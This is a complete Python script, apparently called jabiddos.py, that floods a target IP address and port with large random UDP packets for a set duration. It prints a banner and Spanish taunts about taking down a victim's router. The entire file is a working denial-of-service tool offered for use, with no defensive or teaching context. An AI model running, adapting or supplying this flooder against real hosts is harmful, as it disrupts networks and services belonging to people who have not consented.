import time
import socket
import random
import sys
from colorama import Fore
def usage():
    print(f"""
{Fore.RED}
       █████           █████      ███  █████      ███  ██████████       █████                 
      ░░███           ░░███      ░░░  ░░███      ░░░  ░░███░░░░███     ░░███                  
       ░███   ██████   ░███████  ████  ░███████  ████  ░███   ░░███  ███████   ██████   █████ 
       ░███  ░░░░░███  ░███░░███░░███  ░███░░███░░███  ░███    ░███ ███░░███  ███░░███ ███░░  
       ░███   ███████  ░███ ░███ ░███  ░███ ░███ ░███  ░███    ░███░███ ░███ ░███ ░███░░█████ 
 ███   ░███  ███░░███  ░███ ░███ ░███  ░███ ░███ ░███  ░███    ███ ░███ ░███ ░███ ░███ ░░░░███
░░████████  ░░████████ ████████  █████ ████████  █████ ██████████  ░░████████░░██████  ██████ 
 ░░░░░░░░    ░░░░░░░░ ░░░░░░░░  ░░░░░ ░░░░░░░░  ░░░░░ ░░░░░░░░░░    ░░░░░░░░  ░░░░░░  ░░░░░░  
                                                                                              
{Fore.RED}   {Fore.RESET}                                                                                        
       
{Fore.GREEN}+++====|||||||JABIBI ATTACK IP ROUTER ABAJO COÑAZO POR MMG|||||||====+++{Fore.RESET} 

{Fore.WHITE} ==|| USA "python2 jabiddos.py" "<ip>  <port>  <packet> "||==                                                                                         

"""+Fore.RESET)
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print(f"{Fore.GREEN}JABIBI ATACANDO CON COJONES PA QUE SE SIGA DE MAMAGUEBO JAJAJJJAJAJAJAJAJJAJAJAJAJAJAAJAJAJAJJAJAJAJAJAJJAJAJAJAAJ {sent} A {Fore.RESET} {victim}{Fore.RED} POR{Fore.RESET} {vport} SIN PIEEEEEEEEEEEEEEEEEEEEDAAAAAAAAAAAAAAAAAAAAAAAAAAAD")
def main():
    len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
